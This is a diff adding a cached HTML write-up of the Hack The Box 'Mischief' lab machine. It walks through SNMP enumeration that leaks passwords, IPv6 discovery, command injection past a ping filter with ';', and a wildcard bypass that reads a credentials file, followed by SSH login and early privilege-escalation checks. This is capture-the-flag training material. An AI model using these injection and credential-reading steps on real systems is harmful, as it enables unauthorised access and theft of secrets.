@@ -1,0 +1,383 @@
+I"ôK<h1 id="htb-mischief-10101092-machine-write-up">HTB Mischief (10.10.10.92) MACHINE WRITE-UP</h1>
+
+<h2 id="part-1--initial-recon">PART 1 : INITIAL RECON</h2>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">--min-rate</span> 1000 <span class="nt">-p-</span> <span class="nt">-sT</span> <span class="nt">-sU</span> <span class="nt">-v</span> 10.10.10.92
+<span class="go">
+  22/tcp   open  ssh
+  3366/tcp open  creativepartnr
+  161/udp  open  snmp
+
+</span><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-oN</span> mischief <span class="nt">-p</span> 22,161,3366 <span class="nt">-sC</span> <span class="nt">-sT</span> <span class="nt">-sU</span> <span class="nt">-sV</span> <span class="nt">-v</span> 10.10.10.92
+<span class="go">
+</span><span class="gp">  22/tcp   open          ssh            OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
+<span class="go">  | ssh-hostkey:
+  |   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
+  |   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
+  |_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
+  3366/tcp open          caldav         Radicale calendar and contacts server (Python BaseHTTPServer)
+  | http-auth:
+  | HTTP/1.0 401 Unauthorizedx0D
+  |_  Basic realm=Test
+  | http-methods:
+  |_  Supported Methods: GET HEAD
+  |_http-server-header: SimpleHTTP/0.6 Python/2.7.15rc1
+  |_http-title: Site doesn't have a title (text/html).
+</span><span class="gp">  161/udp  open          snmp           SNMPv1 server;</span><span class="w"> </span>net-snmp SNMPv3 server <span class="o">(</span>public<span class="o">)</span>
+<span class="go">  | snmp-info:
+  |   enterprise: net-snmp
+  |   engineIDFormat: unknown
+  |   engineIDData: b6a9f84e18fef95a00000000
+  |   snmpEngineBoots: 19
+  |_  snmpEngineTime: 59m39s
+  | snmp-interfaces:
+  |   lo
+  |     IP address: 127.0.0.1  Netmask: 255.0.0.0
+  |     Type: softwareLoopback  Speed: 10 Mbps
+  |     Status: up
+  |     Traffic stats: 0.67 Kb sent, 0.67 Kb received
+  |   Intel Corporation 82545EM Gigabit Ethernet Controller (Copper)
+  |     IP address: 10.10.10.92  Netmask: 255.255.255.0
+  |     MAC address: 00:50:56:b9:2c:07 (VMware)
+  |     Type: ethernetCsmacd  Speed: 1 Gbps
+  |     Status: up
+  |_    Traffic stats: 618.08 Kb sent, 23.39 Mb received
+  | snmp-netstat:
+  |   TCP  0.0.0.0:22           0.0.0.0:0
+  |   TCP  0.0.0.0:3366         0.0.0.0:0
+  |   TCP  10.10.10.92:22       10.10.14.213:32850
+  |   TCP  10.10.10.92:22       10.10.14.213:32864
+  |   TCP  10.10.10.92:22       10.10.15.54:40920
+  |   TCP  10.10.10.92:22       10.10.16.63:40704
+  |   TCP  10.10.10.92:3366     10.10.14.213:47812
+  |   TCP  10.10.10.92:3366     10.10.14.213:47814
+  |   TCP  10.10.10.92:3366     10.10.14.213:47816
+  |   TCP  10.10.10.92:3366     10.10.14.213:47818
+  |   TCP  10.10.10.92:3366     10.10.14.213:47820
+  |   TCP  127.0.0.1:3306       0.0.0.0:0
+  |   TCP  127.0.0.53:53        0.0.0.0:0
+  |   UDP  0.0.0.0:161          *:*
+  |   UDP  0.0.0.0:34424        *:*
+  |_  UDP  127.0.0.53:53        *:*
+</span><span class="gp">  | snmp-sysdescr: Linux Mischief 4.15.0-20-generic #</span>21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
+<span class="go">  |_  System uptime: 59m39.09s (357909 timeticks)
+  |_snmp-win32-software:
+</span><span class="gp">  Service Info: Host: Mischief;</span><span class="w"> </span>OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+<span class="go">
+</span></code></pre></div></div>
+<p><strong>NOTE(S)</strong>:</p>
+<ul>
+  <li>An SNMP service is running at <strong>UDP PORT 161</strong>.</li>
+  <li>The web service running on <strong>TCP PORT 3366</strong> is served using a <strong>Python BaseHTTPServer</strong>.</li>
+</ul>
+
+<hr />
+
+<h2 id="part-2--port-enumeration">PART 2 : PORT ENUMERATION</h2>
+
+<h3 id="udp-port-161-snmp">UDP PORT 161 (snmp)</h3>
+
+<ul>
+  <li><strong><code class="highlighter-rouge">snmpwalk</code></strong>:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>snmpwalk <span class="nt">-c</span> public 10.10.10.92 <span class="nt">-v</span> 2c
+<span class="go">
+</span><span class="gp">  iso.3.6.1.2.1.1.1.0 = STRING: "Linux Mischief 4.15.0-20-generic #</span>21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64<span class="s2">"
+</span><span class="go">  iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+  iso.3.6.1.2.1.1.3.0 = Timeticks: (4642890) 12:53:48.90
+  iso.3.6.1.2.1.1.4.0 = STRING: "Me "
+  iso.3.6.1.2.1.1.5.0 = STRING: "Mischief"
+  iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
+  ...omitted...
+
+</span></code></pre></div>    </div>
+    <p><strong>NOTE(S)</strong>:</p>
+    <ul>
+      <li>Processes (<strong><code class="highlighter-rouge">hrSWRunEntry</code></strong>):
+        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">  iso.3.6.1.2.1.25.4.2.1.4.608 = STRING: "python"
+  ...omitted...
+  iso.3.6.1.2.1.25.4.2.1.5.608 = STRING: "-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/"
+  ...omitted...
+</span></code></pre></div>        </div>
+        <ul>
+          <li>The process for the hosted webservice is found.</li>
+          <li>HTTP Authentication credentials are found - <strong><code class="highlighter-rouge">loki : godofmischiefisloki</code></strong></li>
+          <li>The web service is hosted from <strong><code class="highlighter-rouge">/home/loki/hosted</code></strong></li>
+        </ul>
+      </li>
+      <li>IPv6 Addresses (<strong><code class="highlighter-rouge">ipAddressIfIndex</code></strong>):
+        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>snmpwalk <span class="nt">-c</span> public <span class="nt">-v</span> 2c 10.10.10.92 iso.3.6.1.2.1.4.34.1.3.2.16
+<span class="go">
+  iso.3.6.1.2.1.4.34.1.3.2.16.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 1
+  iso.3.6.1.2.1.4.34.1.3.2.16.222.173.190.239.0.0.0.0.2.80.86.255.254.185.245.54 = INTEGER: 2
+  iso.3.6.1.2.1.4.34.1.3.2.16.254.128.0.0.0.0.0.0.2.80.86.255.254.185.245.54 = INTEGER: 2
+
+</span></code></pre></div>        </div>
+        <ul>
+          <li>The 1st one is the <strong>Loopback Address</strong>.</li>
+          <li>The 2ns one is the <strong>Unique-Local Address</strong>.</li>
+          <li>The 3rd one is the <strong>Link Local Address</strong>.</li>
+        </ul>
+      </li>
+      <li>Evaluate the <strong><code class="highlighter-rouge">IPv6</code></strong> address of the system:
+        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">unique_local_oid</span><span class="o">=</span><span class="si">$(</span>snmpwalk <span class="nt">-c</span> public <span class="nt">-v</span> 2c 10.10.10.92 iso.3.6.1.2.1.4.34.1.3.2.16.222 | <span class="nb">sed</span> <span class="nt">-ne</span> <span class="s1">'s/^.*\(222.*\) =.*$/\1/p'</span><span class="si">)</span>
+
+<span class="nv">unique_local_dec</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$unique_local_oid</span> | <span class="nb">tr</span> <span class="s1">'.'</span> <span class="s1">' '</span><span class="si">)</span>
+
+<span class="nv">unique_local_hex</span><span class="o">=</span><span class="si">$(</span><span class="nb">printf</span> <span class="s1">'%02x'</span> <span class="nv">$unique_local_dec</span><span class="si">)</span>
+ 
+<span class="nv">ipv6</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="nv">$unique_local_hex</span> | <span class="nb">fold</span> <span class="nt">-w4</span> | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">':'</span><span class="si">)</span>
+</code></pre></div>        </div>
+        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nv">$ipv6</span>
+<span class="go">
+  dead:beef:0000:0000:0250:56ff:fea4:29f2
+
+</span></code></pre></div>        </div>
+      </li>
+      <li>See if there are other ports open for <strong>IPv6</strong>:
+        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-6</span> <span class="nt">--min-rate</span> 1000 <span class="nt">-p-</span> <span class="nt">-v</span> dead:beef:0000:0000:0250:56ff:fea4:29f2
+<span class="go">      
+  22/tcp   open     ssh
+  80/tcp   open     http
+
+</span><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-6</span> <span class="nt">-p22</span>,80 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-v</span> <span class="nv">$ipv6</span>
+<span class="go">
+</span><span class="gp">  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
+<span class="go">  | ssh-hostkey:
+  |   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
+  |   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
+  |_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
+  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+  |_http-server-header: Apache/2.4.29 (Ubuntu)
+  |_http-title: 400 Bad Request
+</span><span class="gp">  Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
+<span class="go">
+</span></code></pre></div>        </div>
+        <ul>
+          <li>There is another <strong>http service</strong> open using <strong>IPv6</strong>.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="tcp-port-3366-http-ipv4">TCP PORT 3366 (http, IPv4)</h3>
+
+<ul>
+  <li>
+    <p><strong><code class="highlighter-rouge">http://10.10.10.136</code></strong>:</p>
+
+    <p><img src="./screenshots/15_mischief/3366_basic_auth.png" alt="3366 Basic Auth" /></p>
+
+    <p><strong>NOTE(S)</strong>:</p>
+    <ul>
+      <li>The credentials were found during the SNMP enumeration.</li>
+    </ul>
+  </li>
+  <li>
+    <p>Logging in using <strong><code class="highlighter-rouge">loki : godofmischiefisloki</code></strong>:</p>
+
+    <p><img src="./screenshots/15_mischief/3366_authenticated.png" alt="3366 Authenticated" /></p>
+
+    <p><strong>NOTE(S)</strong>:</p>
+    <ul>
+      <li>
+        <p>Two sets of credentials are found:</p>
+
+        <table>
+          <thead>
+            <tr>
+              <th>Username</th>
+              <th>Password</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>loki</td>
+              <td>godofmischiefisloki</td>
+            </tr>
+            <tr>
+              <td>loki</td>
+              <td>trickeryanddeceit</td>
+            </tr>
+          </tbody>
+        </table>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="tcp-port-80-http-ipv6">TCP PORT 80 (http, IPv6)</h3>
+
+<ul>
+  <li>
+    <p><strong><code class="highlighter-rouge">http://[dead:beef:0000:0000:0250:56ff:fea4:29f2]/</code></strong></p>
+
+    <p><img src="./screenshots/15_mischief/80_landing_page.png" alt="80 Landing Page" /></p>
+  </li>
+  <li>
+    <p>Attempt Logging in using the credentials found on <strong>PORT 3366</strong></p>
+
+    <p><img src="./screenshots/15_mischief/80_command_execution.png" alt="80 Command Execution" /></p>
+
+    <p><strong>NOTE(S)</strong>:</p>
+    <ul>
+      <li>The credential pair, <strong><code class="highlighter-rouge">administrator : trickeryanddeceit</code></strong>, worked.</li>
+      <li>So far, only the <strong><code class="highlighter-rouge">ping</code></strong> command could be executed.</li>
+      <li><strong><code class="highlighter-rouge">In my home directory, i have my password in a file called credentials, Mr Admin</code></strong></li>
+    </ul>
+  </li>
+</ul>
+
+<hr />
+
+<h3 id="part-3--exploitation">PART 3 : EXPLOITATION</h3>
+
+<ul>
+  <li>Bypass the command execution in the service running on <strong>port 80</strong>:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ping <span class="nt">-c</span> 2 127.0.0.1<span class="p">;</span> <span class="nb">id</span>
+<span class="go">    
+  PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+  64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms
+  64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.061 ms
+
+  --- 127.0.0.1 ping statistics ---
+  2 packets transmitted, 2 received, 0% packet loss, time 1028ms
+  rtt min/avg/max/mdev = 0.020/0.040/0.061/0.021 ms
+  Command was executed succesfully!
+
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">id</span><span class="p">;</span> ping <span class="nt">-c</span> 2 127.0.0.1
+<span class="go">    
+  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  Command was executed succesfully!
+
+</span></code></pre></div>    </div>
+    <p><strong>NOTE(S)</strong>:</p>
+    <ul>
+      <li>The command execution could be bypassed by using a <strong><code class="highlighter-rouge">;</code></strong>.</li>
+      <li>The first command is the only one being executed</li>
+    </ul>
+  </li>
+</ul>
+
+<hr />
+
+<h2 id="part-4--generate-user-shell">PART 4 : GENERATE USER SHELL</h2>
+
+<ul>
+  <li>Take the file called <strong><code class="highlighter-rouge">credentials</code></strong> from the <strong><code class="highlighter-rouge">home directory</code></strong>:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> /home/<span class="k">*</span><span class="p">;</span> ping <span class="nt">-c</span> 2 127.0.0.1
+<span class="go">
+  /home/loki
+  Command was executed succesfully!
+
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> /home/loki/<span class="k">*</span><span class="p">;</span> ping <span class="nt">-c</span> 2 127.0.0.1
+<span class="go"> 
+  /home/loki/credentials /home/loki/hosted /home/loki/user.txt
+  Command was executed succesfully!
+
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /home/loki/credentials<span class="p">;</span> ping <span class="nt">-c</span> 2 127.0.0.1
+<span class="go">
+  Command is not allowed.
+
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /home/loki/cred<span class="k">*</span><span class="p">;</span> ping <span class="nt">-c</span> 2 127.0.0.1
+<span class="go">
+  pass: lokiisthebestnorsegod
+  Command was executed succesfully!
+
+</span></code></pre></div>    </div>
+    <p><strong>NOTE(S)</strong>:</p>
+    <ul>
+      <li>The word <strong><code class="highlighter-rouge">credentials</code></strong> is being filtered out by the service.</li>
+      <li>It was bypassed by using a <strong>wildcard</strong>.</li>
+    </ul>
+  </li>
+  <li>Login via <strong><code class="highlighter-rouge">ssh</code></strong>:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-l</span> loki 10.10.10.92
+<span class="go">  The authenticity of host '10.10.10.92 (10.10.10.92)' can't be established.
+  ECDSA key fingerprint is SHA256:deaxXTK7ORthfGcKdblPRUmgNrU20oclqMbwVj3hzYI.
+  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+  Warning: Permanently added '10.10.10.92' (ECDSA) to the list of known hosts.
+</span><span class="gp">$</span><span class="w"> </span>loki@10.10.10.92<span class="s1">'s password: lokiisthebestnorsegod
+</span><span class="go">  
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">
+  bf58........................0060
+
+</span></code></pre></div>    </div>
+  </li>
+</ul>
+
+<hr />
+
+<h2 id="part-5--privilege-escalation-loki---root">PART 5 : PRIVILEGE ESCALATION (loki -&gt; root)</h2>
+
+<ul>
+  <li>Check for interesting files in <strong><code class="highlighter-rouge">loki</code></strong>â€™s home directory:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-lah</span> ~
+<span class="go">    
+  -rw------- 1 loki loki  192 Jul 14  2018 .bash_history
+  ...omitted...
+  -rw-rw-r-- 1 loki loki   28 May 17  2018 credentials
+  ...omitted...
+  -rw-r--r-- 1 loki loki    0 May 14  2018 .sudo_as_admin_successful
+  -r-------- 1 loki loki   33 May 17  2018 user.txt
+  ...omitted...
+
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> .bash_history
+<span class="go">   
+  python -m SimpleHTTPAuthServer loki:lokipasswordmischieftrickery
+  ...omitted...
+  sudo su
+  su
+  exit
+  su root
+  ...omitted...
+  exit
+
+</span></code></pre></div>    </div>
+    <p><strong>NOTE(S)</strong>:</p>
+    <ul>
+      <li>There was an attempt to execute <strong><code class="highlighter-rouge">su root</code></strong> in the <strong><code class="highlighter-rouge">.bash_history</code></strong>.</li>
+      <li>There is a <strong><code class="highlighter-rouge">.sudo_as_admin_successful</code></strong> which might mean the attempt was successful.</li>
+      <li>A previously unknown credential pair was used to initialize the python <strong><code class="highlighter-rouge">simpleHTTPAuthServer</code></strong>.
+        <ul>
+          <li>This might be a lead for the <strong>root password</strong>.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>Attempt to execute <strong><code class="highlighter-rouge">su root</code></strong>:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>su root
+<span class="go"> 
+  -bash: /bin/su: Permission denied
+
+</span></code></pre></div>    </div>
+  </li>
+  <li>Check privileges for the <strong><code class="highlighter-rouge">su</code></strong> command:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>getfacl <span class="nt">-R</span> <span class="nt">-s</span> / 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-A</span> 9 su
+<span class="go">    
+</span><span class="gp">  #</span><span class="w"> </span>file: usr/bin/sudo
+<span class="gp">  #</span><span class="w"> </span>owner: root
+<span class="gp">  #</span><span class="w"> </span>group: root
+<span class="gp">  #</span><span class="w"> </span>flags: s--
+<span class="go">  user::rwx
+  user:loki:r--
+  group::r-x
+  mask::r-x
+  other::r-x
+
+</span><span class="gp">  #</span><span class="w"> </span>file: bin/su
+<span class="gp">  #</span><span class="w"> </span>owner: root
+<span class="gp">  #</span><span class="w"> </span>group: root
+<span class="gp">  #</span><span class="w"> </span>flags: s--
+<span class="go">  user::rwx
+  user:loki:r--
+  group::r-x
+  mask::r-x
+  other::r-x
+  
+</span></code></pre></div>    </div>
+  </li>
+</ul>
+
+:ET
